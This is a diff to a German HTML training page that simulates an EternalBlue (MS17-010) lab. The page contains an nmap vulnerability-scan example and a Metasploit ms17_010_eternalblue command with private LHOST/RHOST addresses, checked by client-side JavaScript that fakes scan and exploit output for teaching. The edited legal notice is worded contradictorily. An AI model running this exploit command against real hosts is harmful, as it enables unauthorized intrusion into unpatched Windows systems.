@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Patch-Lab: Blue und WannaCry</title>
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
   <style>
     body {
       font-family: 'Roboto', Arial, sans-serif;
@@ -92,8 +91,8 @@
   </style>
 
   <link rel="stylesheet" href="assets/cdl-unified.css">
-    <script data-goatcounter="https://cyberdef.goatcounter.com/count"
-            async src="https://gc.zgo.at/count.js"></script>
+  <script src="assets/js/lab-state.js"></script>
+  <script src="assets/js/lab-ui.js" defer></script>
 </head>
 <body>
   <div class="container">
@@ -129,8 +128,8 @@
     <h2>Schritt 1: Netzwerkscan mit Nmap</h2>
     <p>
       Führe einen erweiterten Netzwerkscan durch, um herauszufinden, welche Geräte im Netzwerk erreichbar sind. Dabei kommen erweiterte Scan-Parameter
-      zum Einsatz (z.B. <code>-A -sS -sV -O</code>), um neben offenen Ports auch Betriebssystemdetails, Versionsinformationen und Sicherheitslücken wie CVE-2017-0144 zu erkennen.
-      Hinweis: Der Einsatz von nmap auf fremden IP-Adressen ohne Genehmigung ist <strong>illegal</strong>.
+      zum Einsatz (z.B. <code>-A -sS --script smb-vuln-ms17-010</code>), um neben offenen Ports auch Betriebssystemdetails, Versionsinformationen und Sicherheitslücken wie CVE-2017-0144 zu erkennen.
+      Hinweis: Der Einsatz von nmap auf fremden IP-Adressen ohne Genehmigung ist nur mit ausdrücklicher Erlaubnis des Verantwortlichen vorgesehen. Nutze für Übungen ausschließlich freigegebene Ziele.
     </p>
     <pre>
 LHOST=192.168.1.100
@@ -166,6 +165,7 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
 
   <script>
     const scanResults = {};
+    let exploitRunning = false;
 
     function scanIP(target) {
       const console1 = document.getElementById("console-1");
@@ -176,7 +176,9 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
         return;
       }
 
-      console1.innerHTML += `Starte erweiterten Scan für ${target} mit Parametern (-A -sS -sV -O)...\n`;
+      button.disabled = true;
+      scanResults[target] = "running";
+      console1.innerHTML += `Starte erweiterten Scan für ${target} mit Parametern (-A -sS --script smb-vuln-ms17-010)...\n`;
       setTimeout(() => {
         if (target === "RHOST1") {
           console1.innerHTML += `
@@ -188,19 +190,21 @@ PORT      STATE SERVICE
 443/tcp   open  https
 3389/tcp  open  ms-wbt-server
 -------------------------------------------------
-OS Details: Windows 10 Pro, fully patched.
+OS-Hinweis: Windows 10 Pro.
+[Simulation] Dieses Übungsziel ist gegen MS17-010 gepatcht.
           `.trim() + "\n\n";
         } else if (target === "RHOST2") {
           console1.innerHTML += `
 Nmap Scan Report for 192.168.1.20
 Host is up (0.0023s latency).
-Not shown: 995 closed ports
+Not shown: 997 closed ports
 PORT      STATE SERVICE
 80/tcp    open  http
 445/tcp   open  microsoft-ds (SMB)
 3389/tcp  open  ms-wbt-server
 -------------------------------------------------
-OS Details: Windows 7 SP1, unpatched.
+OS-Hinweis: Windows 7 SP1.
+[Simulation] Dieses Übungsziel ist nicht gegen MS17-010 gepatcht.
 Vulnerability: CVE-2017-0144 (EternalBlue) detected via smb-vuln-ms17-010 script.
           `.trim() + "\n\n";
         }
@@ -219,7 +223,9 @@ Vulnerability: CVE-2017-0144 (EternalBlue) detected via smb-vuln-ms17-010 script
       const console2 = document.getElementById("console-2");
       const expectedCommand = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST 192.168.1.20; run"';
 
+      if (exploitRunning) return;
       if (input === expectedCommand) {
+        exploitRunning = true;
         console2.innerHTML = "Starte Exploit...\n";
         setTimeout(() => {
           console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
